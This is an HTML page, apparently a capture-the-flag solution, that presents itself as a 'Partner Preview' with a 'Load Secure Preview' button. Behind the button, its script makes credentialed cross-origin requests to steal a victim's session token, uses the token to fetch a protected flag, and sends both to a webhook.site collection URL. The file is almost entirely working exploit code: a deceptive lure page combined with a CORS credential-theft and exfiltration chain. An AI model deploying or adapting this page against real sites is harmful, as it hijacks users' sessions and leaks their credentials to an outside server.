<!DOCTYPE html>
<html>
<head>
    <title>Partner Preview Integration</title>
</head>
<body>
    <h1>Palantir Partner Preview (CTF Demo)</h1>
    <p>Click below to load the community accounts preview. Ensure you're signed in on the target tab.</p>
    <button onclick="loadPreview()">Load Secure Preview</button>
    <iframe id="targetFrame" style="display:none;" sandbox="allow-scripts allow-same-origin"></iframe>
    <script>
        async function loadPreview() {
            // Embed target in iframe (shares cookies if same-site, but we use CORS for fetch)
            const frame = document.getElementById('targetFrame');
            frame.src = 'https://web200-1.pointeroverflowctf.com/';  // Loads main page, sets session if authenticated

            // Wait a bit for load (adjust if needed)
            setTimeout(async () => {
                try {
                    // Step 1: Cross-origin fetch for session-scoped token (assumes endpoint like /api/token leaks it)
                    // Replace /api/token with actual endpoint if different (inspect target network tab after sign-in)
                    const tokenRes = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
                        method: 'GET',
                        credentials: 'include',  // Sends cookies for auth
                        mode: 'cors'  // Triggers CORS, trusted since origin is github.io
                    });
                    if (!tokenRes.ok) throw new Error('Token fetch failed');
                    const tokenData = await tokenRes.json();
                    const apiToken = tokenData.token;  // Assume response: { "token": "session_token_here" }
                    console.log('Exfiltrated Token:', apiToken);

                    // Step 2: Use token to fetch flag
                    const flagRes = await fetch('https://web200-1.pointeroverflowctf.com/api/flag', {
                        method: 'GET',
                        headers: {
                            'Authorization': `Bearer ${apiToken}`,  // Or whatever auth the token uses (e.g., X-API-Token)
                            'X-Flag-Token': apiToken  // As per challenge: Send using X-Flag-Token
                        },
                        credentials: 'include',
                        mode: 'cors'
                    });
                    if (!flagRes.ok) throw new Error('Flag fetch failed');
                    const flagData = await flagRes.text();  // Assume flag is plain text or JSON
                    console.log('Flag:', flagData);

                    // Step 3: Exfiltrate (log + send to your server for capture)
                    fetch('https://webhook.site/your-unique-id', {  // Replace with your webhook.site URL
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ token: apiToken, flag: flagData })
                    });

                } catch (err) {
                    console.error('Error:', err);
                    // Fallback: If /api/token doesn't exist, inspect for other endpoints (e.g., /api/user)
                }
            }, 2000);
        }
    </script>
</body>
</html>
